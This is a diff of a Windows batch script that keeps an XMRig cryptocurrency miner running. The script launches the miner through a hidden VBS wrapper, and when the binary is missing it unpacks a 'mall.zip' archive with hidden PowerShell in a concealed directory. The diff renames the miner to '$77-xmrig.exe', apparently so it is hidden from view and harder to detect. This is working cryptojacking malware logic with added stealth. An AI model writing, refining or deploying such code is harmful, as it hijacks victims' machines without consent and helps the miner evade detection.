@@ -22,9 +22,9 @@ if not exist "%HIDDEN_DIR%run_hidden.vbs" (
 
 powershell -Command "Get-Process rig -ErrorAction SilentlyContinue" >nul 2>&1
 if %errorlevel% neq 0 (
-    echo [%time%] xmrig.exe not running - attempting start
-    if exist "%ORIGINAL_DIR%xmrig.exe" (
-        wscript.exe "%HIDDEN_DIR%run_hidden.vbs" "%ORIGINAL_DIR%xmrig.exe"
+    echo [%time%] $77-xmrig.exe not running - attempting start
+    if exist "%ORIGINAL_DIR%$77-xmrig.exe" (
+        wscript.exe "%HIDDEN_DIR%run_hidden.vbs" "%ORIGINAL_DIR%$77-xmrig.exe"
     ) else (
 
         powershell -WindowStyle Hidden -Command ^
@@ -32,8 +32,8 @@ if %errorlevel% neq 0 (
              Expand-Archive '%HIDDEN_DIR%mall.zip' '%HIDDEN_DIR%' -Force; ^
              Remove-Item '%HIDDEN_DIR%mall.zip' -Force"
         
-        if exist "%HIDDEN_DIR%xmrig.exe" (
-            wscript.exe "%HIDDEN_DIR%run_hidden.vbs" "%HIDDEN_DIR%xmrig.exe"
+        if exist "%HIDDEN_DIR%$77-xmrig.exe" (
+            wscript.exe "%HIDDEN_DIR%run_hidden.vbs" "%HIDDEN_DIR%$77-xmrig.exe"
         )
     )
 )
